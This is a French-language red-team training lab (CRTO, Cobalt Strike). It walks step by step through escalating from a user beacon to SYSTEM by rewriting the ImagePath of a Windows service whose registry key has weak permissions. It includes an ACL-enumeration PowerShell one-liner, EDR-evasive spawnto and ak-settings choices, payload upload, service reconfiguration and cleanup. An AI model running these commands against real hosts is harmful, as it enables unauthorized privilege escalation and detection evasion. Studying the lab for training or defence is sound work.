# Lab — Privilege Escalation locale

> **Objectif :** étudier les conséquences de permissions faibles sur les clés Registry des services Windows, depuis un Beacon utilisateur jusqu’au contexte SYSTEM.

---

## Comprendre le contexte du lab

> **Place de cette étape dans le parcours CRTO :**
> ```
> Initial Access (beacon as pchilds, medium integrity)
>   → [Phase 4] COM Hijack Persistence (user-level — deploy FIRST, no admin needed)
>   → [THIS LAB] Privilege Escalation → SYSTEM beacon
>   → [Phase 6] Elevated Persistence (WMI event subscription — requires SYSTEM)
>   → Credential Access → Lateral Movement → ...
> ```

**Pourquoi certains contrôles nécessitent SYSTEM :**

Plusieurs opérations Post-Exploitation dépendent d’un niveau d’intégrité élevé ou des droits SYSTEM :
- `krb_dump` l’accès aux TGT Kerberos de plusieurs sessions nécessite des droits élevés
- `dcsync` nécessite des permissions Domain Admin ou de réplication AD, indépendantes des droits SYSTEM locaux
- les abonnements WMI persistants peuvent nécessiter des droits d’écriture administrateur
- les méthodes Lateral Movement utilisant les partages administratifs distants (`ADMIN$`, `C$`) nécessitent des droits administrateur sur la cible

Un Beacon de moyenne intégrité permet de nombreuses vérifications, mais certains scénarios exigent des privilèges plus élevés.

**Pourquoi vérifier les permissions Registry des services :**

Les services Windows enregistrent leur configuration dans `HKLM\SYSTEM\CurrentControlSet\Services\<name>`. La valeur `ImagePath` désigne le binaire lancé par le Service Control Manager au démarrage du service. Si un groupe non privilégié (`Everyone`, `BUILTIN\Users`, `Authenticated Users`) dispose de `FullControl` sur une clé de service, il peut modifier sa configuration. Le risque dépend notamment de l’identité sous laquelle ce service fonctionne.

Il s’agit d’une mauvaise configuration des permissions, sans vulnérabilité CVE ni exploitation de noyau nécessaire dans ce scénario. Points à considérer :
- `OPSEC-🟠CAUTION`  le démarrage et l’arrêt de services produisent des événements observables
- la réussite dépend des ACL et de la configuration effective du service
- le chemin initial peut être restauré après le test du lab

---

## Comprendre les paramètres `spawnto`

Dans ce lab, `spawnto` intervient dans deux contextes distincts. Les différencier évite de confondre les paramètres du Beacon et ceux des binaires générés par l’Artifact Kit.

### Mécanisme fork-and-run

Certaines commandes, notamment `execute-assembly` et `powerpick`, utilisent le mécanisme fork-and-run. Le lab présente les étapes de ce mécanisme :

```
1. Spawns a new sacrificial child process     ← THIS is what spawnto controls
2. Injects a post-ex DLL into that child
3. The DLL runs the task (assembly, PS script, etc.)
4. Output is sent back to beacon via named pipe
5. Child process is killed
```

Le processus enfant est appelé **sacrificial process**. Il est distinct du processus Beacon initial, même si son activité reste visible par les outils de sécurité.

**`spawnto` :** définit le processus employé pour certaines tâches Post-Exploitation.

### Paramètre par défaut

Sans configuration spécifique, le scénario présente `rundll32.exe` comme processus temporaire par défaut des opérations fork-and-run :

```
beacon process
    └── rundll32.exe   ← Defender/EDR has explicit detection rules for this
            └── [your execute-assembly / powerpick DLL injected here]
```

L’utilisation de `rundll32.exe` dans une arborescence de processus inhabituelle peut faire partie des indicateurs surveillés. Les conséquences exactes sur la notation OPSEC doivent être vérifiées dans les critères officiels.

### Les différents paramètres `spawnto`

Trois réglages aux noms proches interviennent dans des contextes indépendants :

| Réglage | Syntaxe | Fonction | Périmètre | Moment d’application |
|---------|--------|-----------------|-------|-----------------|
| Paramètre du Beacon courant | `beacon> spawnto x64 <path>` | Processus temporaire des opérations fork-and-run du Beacon | Beacon courant jusqu’à modification | Opérations fork-and-run du Beacon courant |
| Valeur du profil | `post-ex { set spawnto_x64 "..." }` | Processus temporaire par défaut des nouveaux Beacons | Beacons associés au team server | Valeur appliquée automatiquement aux nouveaux Beacons |
| Binaire de service | `beacon> ak-settings spawnto_x64 <path>` | Processus utilisé par le binaire service généré par l’Artifact Kit | Uniquement les payloads Service EXE | Lors du lancement d’un Service EXE : `jump psexec64`, `jump scshell64`, service-based privesc |

La modification d’un réglage ne change pas automatiquement les deux autres.

### Tenir compte du contexte du processus

Le processus temporaire doit être analysé dans le contexte réel de la machine et de son activité habituelle :

| Type de machine | Exemples de processus | Contexte |
|-----------|---------------------|-----|
| Workstation avec session utilisateur | `msedge.exe`, `chrome.exe` | Navigateur potentiellement présent dans une session utilisateur |
| Hôte Windows | `werfault.exe` | Composant Windows Error Reporting |
| Serveur sans utilisateur graphique | `dllhost.exe`, `svchost.exe` | Processus COM et services courants |
| Binaire de service context | `svchost.exe` | Relations entre processus de service à analyser |

**Attention :** les processus choisis peuvent modifier la télémétrie observée, sans garantir une exécution réussie ni l’absence de détection.

---

## Enumeration

### Configurer spawnto pour le Beacon courant

```cs
beacon> spawnto x64 C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
```

**Rôle de la commande :**
Ce réglage définit `msedge.exe` comme processus temporaire pour les opérations fork-and-run suivantes de la session. La configuration ne crée pas de processus immédiatement.

**Pourquoi `msedge.exe` figure dans l’exemple :**
Sur `lon-wkstn-1`, l’utilisateur `pchilds` dispose d’une session graphique. Le lab utilise `msedge.exe` pour illustrer les relations entre processus parent et enfant.

```
Existing legitimate Edge processes (already running)
beacon process
    └── msedge.exe (your sacrificial process — fork & run child)
            └── [powerpick unmanaged PowerShell DLL injected here]
```

Microsoft Edge lance plusieurs processus auxiliaires, notamment pour le rendu et le GPU. Leur présence ne suffit toutefois pas à établir qu’une nouvelle instance est légitime ; le contexte doit être vérifié.

**Pourquoi le réglage figure au début :**
Le lab différencie la configuration de `spawnto` de l’exécution ultérieure de commandes qui utilisent fork-and-run.

> **OPSEC :** dans les notes, `spawnto x64` modifie une valeur interne du Beacon ; aucun processus enfant n’est lancé par cette seule commande.

---

### Énumérer les permissions faibles des clés Registry de services

```cs
beacon> powerpick $lowpriv = @('Everyone', 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lowpriv -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject] @{ServiceName = $_.PSChildName; Identity = $ace.IdentityReference.Value; Rights = $ace.RegistryRights }}}}
```

**Fonctionnement :**
- Parcourt les clés de `HKLM:\SYSTEM\CurrentControlSet\Services` (chaque service installé)
- Récupère les ACL de chaque clé
- Filtre les ACE des groupes peu privilégiés disposant de `FullControl` non hérité
- Retourne le nom du service, l’identité et les droits concernés

**Pourquoi `IsInherited -eq $false` :**
Une ACE non héritée est définie explicitement sur la clé concernée. `FullControl` accordé aux `Authenticated Users` sur une clé de service mérite une investigation.

**Pourquoi `FullControl` :**
`FullControl` inclut le droit `SetValue` sur la clé. Les droits en lecture tels que `ReadKey` ne permettent pas à eux seuls de modifier `ImagePath`.

**Classification OPSEC des notes :** `OPSEC-🟠CAUTION`
- `powerpick` emploie fork-and-run avec le processus temporaire configuré
- l’événement 4688 peut signaler la création d’un processus enfant
- les requêtes Registry avec `Get-Acl` peuvent être analysées par les outils de sécurité
- l’opération concerne les ACL locales plutôt qu’une requête LDAP

> **Résultat attendu :** `BadWindowsService`, exemple de service dont la clé accorde `FullControl` à un groupe non privilégié.

---

## Exploitation

### Configurer le paramètre du binaire service avec `ak-settings`

```cs
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

**Différence avec le premier paramètre `spawnto` :**

Ce réglage concerne un autre mécanisme d’exécution :

`beacon> spawnto x64 <path>` s’applique aux opérations fork-and-run du **Beacon courant**. Les commandes `powerpick` et `execute-assembly` de ce Beacon utilisent alors le processus temporaire défini.

`beacon> ak-settings spawnto_x64 <path>` concerne les **binaires service générés par l’Artifact Kit**. Le payload `Windows Service EXE` fonctionne dans le contexte du Service Control Manager. Il sert de chargeur au Beacon et ses paramètres sont définis séparément, notamment par `ak-settings`.

```
Without ak-settings:
  services.exe (SYSTEM)
      └── http_x64.svc.exe (your payload)
              └── rundll32.exe  ← default, highly signatured as CS indicator

With ak-settings spawnto_x64 svchost.exe:
  services.exe (SYSTEM)
      └── http_x64.svc.exe (your payload)
              └── svchost.exe   ← legitimate service host, expected process chain
                      └── [SYSTEM beacon running here]
```

Le paramètre du Beacon n’est pas automatiquement appliqué aux binaires de service. Les deux contextes sont indépendants.

**Rôle de `svchost.exe` dans cet exemple :**
`svchost.exe` héberge plusieurs services Windows. Le lab illustre une chaîne de processus `services.exe → http_x64.svc.exe → svchost.exe`, dont les liens parent-enfant peuvent être contrôlés par un EDR.

> **OPSEC :** dans le lab, `ak-settings` définit un paramètre de configuration sans lancer immédiatement de processus.

---

### Générer le binaire service du lab

```
Payloads > Windows Stageless Payload
  Listener: http
  Output:   Windows Service EXE
  Save to:  C:\Payloads\http_x64.svc.exe
```

**Différence entre Service EXE et EXE classique :**
Le Service Control Manager attend qu’un véritable service s’enregistre avec `StartServiceCtrlDispatcher`. Un binaire Service EXE possède le code de gestion nécessaire, contrairement à un EXE classique.

**Point d’attention OPSEC :**
L’écriture du fichier EXE sur le disque peut être analysée par Defender. Les résultats dépendent du binaire généré et des paramètres de sécurité ; les observations d’un lab ne garantissent pas leur reproductibilité.

---

### Arrêter le service

```cs
beacon> sc_stop BadWindowsService
```

**Pourquoi vérifier son état avant modification :**
Le démarrage du service utilise le chemin `ImagePath` de sa configuration. L’état initial du service doit être relevé pour permettre une restauration correcte.

**OPSEC :** l’arrêt d’un service peut être journalisé par l’événement système 7036.

---

### Répertoire de travail et transfert du fichier

```cs
beacon> cd C:\Temp
beacon> upload C:\Payloads\http_x64.svc.exe
```

**Pourquoi `C:\Temp` dans cet exemple :**
Le lab utilise `C:\Temp` comme répertoire accessible en écriture. Ses permissions doivent être confirmées dans l’environnement étudié.

**OPSEC :** une écriture de fichier sur disque peut déclencher l’analyse en temps réel de Defender.

---

### Relever la configuration initiale du service

```cs
beacon> sc_qc BadWindowsService
```

**Pourquoi conserver la valeur initiale :**
`sc_qc` affiche notamment le chemin binaire d’origine. Cette valeur est nécessaire pour comparer la configuration avant et après le test et rétablir le service.

---

### Vérifier la modification du chemin binaire du service

```cs
beacon> sc_config BadWindowsService C:\Temp\http_x64.svc.exe 0 2
```

**Signification des arguments :**

| Position | Valeur | Signification |
|----------|-------|---------|
| 1 | `BadWindowsService` | Nom du service concerné |
| 2 | `C:\Temp\http_x64.svc.exe` | Nouvelle valeur Registry `ImagePath` |
| 3 | `0` | Contrôle d’erreur (`SERVICE_ERROR_IGNORE`) |
| 4 | `2` | Type de démarrage (`SERVICE_AUTO_START`) |

**Valeur Registry concernée :**
`HKLM\SYSTEM\CurrentControlSet\Services\BadWindowsService\ImagePath` = `C:\Temp\http_x64.svc.exe`

**OPSEC :** l’événement 4657 peut enregistrer une modification de valeur Registry lorsque l’audit d’accès aux objets est activé.

---

### Démarrer le service

```cs
beacon> sc_start BadWindowsService
```

**Déroulement présenté dans le lab :**
1. Le Service Control Manager consulte `ImagePath` dans Registry → `C:\Temp\http_x64.svc.exe`
2. SCM lance `http_x64.svc.exe` sous `NT AUTHORITY\SYSTEM`
3. Le service s’enregistre avec `StartServiceCtrlDispatcher`, puis exécute le module prévu dans le lab
4. Le module crée `svchost.exe` conformément au paramètre `ak-settings` de l’exercice
5. Le scénario aboutit à un Beacon SYSTEM dans `svchost.exe`, visible dans Cobalt Strike

**Classification OPSEC des notes :** `OPSEC-🟠CAUTION`

| Événement | ID | Origine | Interprétation |
|-------|----|---------------|--------------|
| Service démarré | 7036 | Démarrage standard d’un service | Événement attendu après l’arrêt |
| Nouveau service installé | **7045** | **Non généré dans ce scénario** — you modified existing service | **À noter** — no 7045 = no explicit OPSEC deduction |
| Création de processus | 4688 | Démarrage de `http_x64.svc.exe`, puis de `svchost.exe` | Processus pouvant être observés par un EDR |

> **Observation :** modifier un service existant et créer un nouveau service ne produisent pas nécessairement les mêmes événements. L’absence d’événement 7045 ne garantit pas l’absence de détection.

> Le scénario se termine par le contrôle et la restauration de la configuration du service.

---

### Restaurer la configuration et nettoyer le lab

```cs
beacon> sc_config BadWindowsService "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe" 0 2
beacon> rm http_x64.svc.exe
beacon> sc_start BadWindowsService
```

**Pourquoi restaurer la configuration :**
- un service dont `ImagePath` référence encore le fichier temporaire constitue une modification persistante et visible
- les changements persistants sont susceptibles d’être examinés pendant l’évaluation
- la restauration évite de perturber le fonctionnement normal du service

**Pourquoi supprimer `http_x64.svc.exe` :**
Le fichier temporaire peut rester détectable sur le disque après son exécution. Le lab prévoit de nettoyer les artefacts créés.

**Pourquoi redémarrer le service d’origine :**
Le service doit retrouver son état de fonctionnement et sa configuration initiale.

---

## Contrôles après l’apparition du Beacon SYSTEM

```cs
// From the new SYSTEM beacon:
beacon> getuid                    // confirm: NT AUTHORITY\SYSTEM
beacon> process_browser           // GUI — confirm beacon is in svchost.exe

// Reset fork & run spawnto for this SYSTEM beacon context
// (ak-settings controlled the service EXE — spawnto now controls this beacon's post-ex)
beacon> spawnto x64 %windir%\sysnative\werfault.exe

// Proceed to:
// → labs/Elevated-Persistence-lab.md  (WMI event subscription — requires SYSTEM)
// → Credential Access (krb_dump, dcsync now possible with elevated token)
```

---

## Emplacement des réglages spawnto dans la méthode

```
Phase 1 — Profile (team server startup)
  post-ex { set spawnto_x64 "werfault.exe" }   ← default for all new beacons

Phase 3 — First beacon checks in (workstation, user logged in)
  beacon> spawnto x64 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
  beacon> ppid <explorer.exe PID>               ← pair with ppid for full OPSEC

Phase 5 — Before service payload (privesc / lateral psexec / scshell)
  beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe

Phase 10 — After every lateral move to a new host
  beacon> process_browser                        ← see what is ACTUALLY running here
  beacon> spawnto x64 <process-already-running>  ← match to that host's context
  beacon> ppid <appropriate-parent-pid>

Rule: set spawnto BEFORE running any execute-assembly, powerpick, or mimikatz.
      Match the sacrificial process to what is already normal on that specific host.
      ak-settings is only for service EXE payloads — it has no effect on beacon fork & run.
```
